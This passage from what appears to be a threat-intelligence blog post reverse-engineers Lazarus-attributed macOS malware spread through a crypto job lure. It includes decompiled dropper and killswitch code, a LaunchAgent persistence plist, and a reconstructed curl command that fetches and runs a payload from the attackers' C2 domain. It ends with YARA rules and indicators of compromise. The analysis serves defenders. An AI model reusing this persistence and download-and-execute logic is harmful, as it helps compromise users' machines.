</span></span></code></pre></div><p>Finally, <code>thExec()</code> and then a check against the killswitch are called. If the next stage is already found to be running, execution will stop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=c1>//cont...
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>thExec</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>IsSafariFAExist</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_g_d</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>Shell</span><span class=p>(</span><span class=s>&#34;killall Terminal&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=222---killswitch>2.2.2 - Killswitch<a hidden class=anchor aria-hidden=true href=#222---killswitch>#</a></h4><p>The function <code>IsSafariFAExist()</code> is a killswitch to prevent installation if the next stage is already running on the host. It uses the <code>Shell()</code> helper function to execute <code>pgrep</code> which searches for the running process <em>diageventagent</em>. This function is checked a few times in: main, thExec, and startDaemon. The behavior of exiting if the function returns true is consistent.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>int_conv_of_pgrep_output</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>return_val</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=n>outcome_of_pgrep</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>memset</span><span class=p>(</span><span class=n>outcome_of_pgrep</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>Shell</span><span class=p>(</span><span class=s>&#34;pgrep -f diageventagent&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>outcome_of_pgrep</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>outcome_of_pgrep</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>int_conv_of_pgrep_output</span> <span class=o>=</span> <span class=nf>_atoi</span><span class=p>(</span><span class=o>&amp;</span><span class=n>outcome_of_pgrep</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>int_conv_of_pgrep_output</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>return_val</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(((</span><span class=n>outcome_of_pgrep</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>outcome_of_pgrep</span> <span class=o>!=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>int_conv_of_pgrep_output</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>return_val</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>return_val</span><span class=p>;</span>
</span></span></code></pre></div><h4 id=223---thexec>2.2.3 - <code>thExec()</code><a hidden class=anchor aria-hidden=true href=#223---thexec>#</a></h4><p>This function is responsible for writing the included <code>.app</code> archive and subsequent executables to dist as well as triggering the persistence mechanism. Just like main it makes heavy use of <code>Shell()</code> and most of it&rsquo;s length comes from the tedious tedious string building.</p><p>There are 5 main strings built:</p><ol><li>A source path: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent_</code></li><li>A destination path: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent</code></li><li>A temp path: <code>/Users/{username}/Library/DiagnosticsPeer/diagevent_</code></li><li>Command 1:<code>tar zxvf \'{temp}\' -C \'{dest}\'</code></li><li>Command 2: <code>open -a \'{dest}/diageventd.app\'</code></li></ol><p>The core logic of this function is quite short and centers around checking against the killswitch before triggering the persistence mechanism.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>IsSafariFAExist</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>Shell</span><span class=p>(</span><span class=s>&#34;killall Terminal&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>IsSafariFAExist</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int32_t</span> <span class=n>x0_45</span><span class=p>;</span> <span class=c1>// killswitch status
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>Shell</span><span class=p>(</span><span class=o>&amp;</span><span class=n>command2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>startDaemon</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nf>_sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>_g_c</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// global state variable
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>x0_45</span> <span class=o>=</span> <span class=nf>IsSafariFAExist</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>x0_45</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>_access</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dest</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0xffffffff</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_g_e</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// global state variable
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=224---persistence>2.2.4 - Persistence<a hidden class=anchor aria-hidden=true href=#224---persistence>#</a></h4><p>The <code>startDaemon()</code> function is how this malware establishes persistence. It does so through a LaunchAgent daemon called &ldquo;iTunes_trush&rdquo; (banger playlist name).</p><p>The general flow of this function is:</p><ol><li>Create directory in <code>/Users/{username}/Library/LaunchAgents/</code></li><li>Create plist file in <code>/Users/{username}/Library/LaunchAgents/com.diagnosticspeer.plist</code></li><li>Create filepath string for second stage executable: <code>/Users/{username}/Library/DiagnosticsPeer/diageventagent</code></li><li>Write second stage executable.</li></ol><p>The following is the contents of the written plist file. It is setup so that launchd will runs the executable <code>diageventagent</code> at system boot.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>plist</span> <span class=na>version</span><span class=o>=</span><span class=s>&#34;1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>dict</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>key</span><span class=p>&gt;</span>Label<span class=p>&lt;/</span><span class=nt>key</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=p>&lt;</span><span class=nt>string</span><span class=p>&gt;</span>iTunes_trush<span class=p>&lt;/</span><span class=nt>string</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>key</span><span class=p>&gt;</span>OnDemand<span class=p>&lt;/</span><span class=nt>key</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=p>&lt;</span><span class=nt>true</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>key</span><span class=p>&gt;</span>ProgramArguments<span class=p>&lt;/</span><span class=nt>key</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>array</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=p>&lt;</span><span class=nt>string</span><span class=p>&gt;</span>/Users/{username}/Library/DiagnosticsPeer/diageventagent<span class=p>&lt;/</span><span class=nt>string</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;/</span><span class=nt>array</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>key</span><span class=p>&gt;</span>RunAtLoad<span class=p>&lt;/</span><span class=nt>key</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=p>&lt;</span><span class=nt>true</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>&lt;</span><span class=nt>key</span><span class=p>&gt;</span>KeepAlive<span class=p>&lt;/</span><span class=nt>key</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>			<span class=p>&lt;</span><span class=nt>true</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;/</span><span class=nt>dict</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>plist</span><span class=p>&gt;</span>
</span></span></code></pre></div><h2 id=3-third-stage>3. Third Stage<a hidden class=anchor aria-hidden=true href=#3-third-stage>#</a></h2><table><thead><tr><th>Trait</th><th>Value</th></tr></thead><tbody><tr><td>Name</td><td>diageventagent</td></tr><tr><td>MD5</td><td>edc8136611b90ea492830adde099b1a6</td></tr><tr><td>SHA-1</td><td>1104a10689f4887ea9bba47fe3e115e271414fbe</td></tr><tr><td>SHA-256</td><td>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7</td></tr></tbody></table><h3 id=31---preliminary-analysis>3.1 - Preliminary Analysis<a hidden class=anchor aria-hidden=true href=#31---preliminary-analysis>#</a></h3><p>Again, this file is a Mach-O universal binary so we repeat the process of extracting a particular build for the purposes of analysis. I chose the ARM version for consistency.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  stage2 file fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7
</span></span><span class=line><span class=cl>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7: Mach-O universal binary with <span class=m>2</span> architectures: <span class=o>[</span>x86_64:Mach-O 64-bit executable x86_64<span class=o>]</span> <span class=o>[</span>arm64:Mach-O 64-bit executable arm64<span class=o>]</span>
</span></span><span class=line><span class=cl>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 <span class=o>(</span><span class=k>for</span> architecture x86_64<span class=o>)</span>:	Mach-O 64-bit executable x86_64
</span></span><span class=line><span class=cl>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 <span class=o>(</span><span class=k>for</span> architecture arm64<span class=o>)</span>:	Mach-O 64-bit executable arm64
</span></span><span class=line><span class=cl>➜  stage2 lipo fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 -thin arm64 -output stage2-arm-sample
</span></span></code></pre></div><h3 id=32---static-analysis>3.2 - Static Analysis<a hidden class=anchor aria-hidden=true href=#32---static-analysis>#</a></h3><p>After opening up this file in Binja we can see that it is also not stripped and shares a number of similarities with the previous stage.</p><p><strong>Function list</strong>:</p><table><thead><tr><th>Address</th><th>Name</th></tr></thead><tbody><tr><td>0x100002c3c</td><td>int64_t ExecuteFile(int64_t arg1)</td></tr><tr><td>0x100002c90</td><td>int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3)</td></tr><tr><td>0x100002dc8</td><td>int64_t pclose2(int64_t arg1)</td></tr><tr><td>0x100002dd0</td><td>int64_t Shell()</td></tr><tr><td>0x100002f58</td><td>int64_t write_data()</td></tr><tr><td>0x100002f5c</td><td>int64_t DownloadFile()</td></tr><tr><td>0x10000367c</td><td>void strreverse(char* arg1, int64_t arg2)</td></tr><tr><td>0x1000036ac</td><td>void itoa(int64_t arg1, char* arg2, int32_t arg3)</td></tr><tr><td>0x100003744</td><td>int64_t cp()</td></tr><tr><td>0x1000038d0</td><td>int64_t _main()</td></tr></tbody></table><h4 id=321---main>3.2.1 - Main<a hidden class=anchor aria-hidden=true href=#321---main>#</a></h4><p><strong>Shocker</strong> this main also is mostly just string building. This stage also preodically checks in with the C2 server to try and download a payload located at <code>https[:]//capitalzeroco.com/{user's UID}.png</code>. If the file is found, it would be written to <code>/Users/{username}/"/Library/DiagnosticsPeer/AppStore</code>.</p><p>It then drops into the following infinite loop:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>x0_10</span> <span class=o>=</span> <span class=nf>DownloadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>x0_10</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nf>_sleep</span><span class=p>(</span><span class=mh>0x4b0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>x0_10</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>ExecuteFile</span><span class=p>(</span><span class=o>&amp;</span><span class=n>filepath</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>_sleep</span><span class=p>(</span><span class=mh>0x4b0</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=322---download-file>3.2.2 - Download File<a hidden class=anchor aria-hidden=true href=#322---download-file>#</a></h4><p>Then <code>libcurl</code> to build a curl command that would be equivalent to:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X GET <span class=s2>&#34;https[:]//capitalzeroco[.]com?response=&lt;response_data&gt;&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     -H <span class=s2>&#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>     -H <span class=s2>&#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8&#34;</span>
</span></span></code></pre></div><p>If there is a successful download, it would try to perform the following command using the <code>Shell()</code> helper:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tar zxvf <span class=se>\&#39;</span><span class=o>{}</span><span class=se>\&#39;</span> -C <span class=se>\&#39;</span><span class=o>{</span>new file<span class=o>}</span><span class=se>\&#39;</span><span class=s2>&#34;
</span></span></span></code></pre></div><h2 id=4-infrastructure-analysis>4. Infrastructure Analysis<a hidden class=anchor aria-hidden=true href=#4-infrastructure-analysis>#</a></h2><p>The C2 domain in this sample is capitalzeroco[.]com and currently points to the domain 172[.]93[.]201[.]106. It is currently running Microsoft IIS and has RDP exposed. This means that this host is most likely a compromised asset making pivoting off this particular infra difficult.</p><p>The domain was registered on Porkbun which is a favorite of</p><h2 id=5-appendix>5. Appendix<a hidden class=anchor aria-hidden=true href=#5-appendix>#</a></h2><h3 id=51---yara-rules>5.1 - YARA Rules<a hidden class=anchor aria-hidden=true href=#51---yara-rules>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=l>rule operation_intercept_macos_stage1 {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=nt>meta</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>description = &#34;Detecting persistence of macOS persistence Lazarus&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>author = &#34;@birchb0y&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>reference = &#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>date = &#34;2023-13-05&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nt>strings</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist1 = &#34;com.diagnosticspeer.plist&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist2 = &#34;DiagnosticsPeer&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist3 = &#34;pgrep -f diageventagent&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist4 = &#34;diageventagent_&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist5 = &#34;diagevent_&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist6 = &#34;diageventagent&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$persist7 = &#34;diageventd.app&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$plist1 = &#34;iTunes_trush&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$plist2 = &#34;OnDemand&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$plist3 = &#34;RunAtLoad&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$plist4 = &#34;KeepAlive&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nt>condition</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>any of ($persist*) or all of ($plist*)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>rule operation_intercept_stage2 {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=nt>meta</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>description = &#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>author = &#34;@birchb0y&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>reference = &#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>date = &#34;2023-13-05&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nt>strings</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$string1 = &#34;DiagnosticsPeer&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$string2 = &#34;capitalzeroco.com&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$curl1 = &#34;Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>$curl2 = &#34;Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nt>condition</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=l>any of ($string*) or all of ($curl*)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span></code></pre></div><h3 id=52---iocs>5.2 - IOCs<a hidden class=anchor aria-hidden=true href=#52---iocs>#</a></h3><p><strong>Files</strong></p><table><thead><tr><th>Name</th><th>SHA-256</th></tr></thead><tbody><tr><td>CryptoComJobOpportunities.pdf</td><td>8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0</td></tr><tr><td>diageventagent</td><td>fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7</td></tr><tr><td>CryptoComJD.zip</td><td>a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec</td></tr></tbody></table><p><strong>Infrastructure</strong></p><table><thead><tr><th>Domain</th><th>IP</th></tr></thead><tbody><tr><td>capitalzeroco[.]com</td><td>172[.]93[.]201[.]106</td></tr></tbody></table></div><footer class=post-footer><ul class=post-tags><li><a href=https://examplesite.com/tags/lazarus/>Lazarus</a></li><li><a href=https://examplesite.com/tags/malware/>Malware</a></li><li><a href=https://examplesite.com/tags/re/>RE</a></li><li><a href=https://examplesite.com/tags/cti/>CTI</a></li><li><a href=https://examplesite.com/tags/north-korea/>North Korea</a></li><li><a href=https://examplesite.com/tags/macos/>macOS</a></li></ul><nav class=paginav><a class=next href=https://examplesite.com/posts/lazarus-loves-crypto/><span class=title>Next »</span><br><span>Lazarus Using Leaked Hacking Team Tooling</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on twitter" href="https://twitter.com/intent/tweet/?text=Crypto%20Workers%20Wanted&url=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f&hashtags=Lazarus%2cMalware%2cRE%2cCTI%2cNorthKorea%2cmacOS"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f&title=Crypto%20Workers%20Wanted&summary=Crypto%20Workers%20Wanted&source=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f&title=Crypto%20Workers%20Wanted"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Crypto Workers Wanted on whatsapp" href="https://api.whatsapp.com/send?text=Crypto%20Workers%20Wanted%20-%20https%3a%2f%2fexamplesite.com%2fposts%2fcrypto-workers-wanted%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 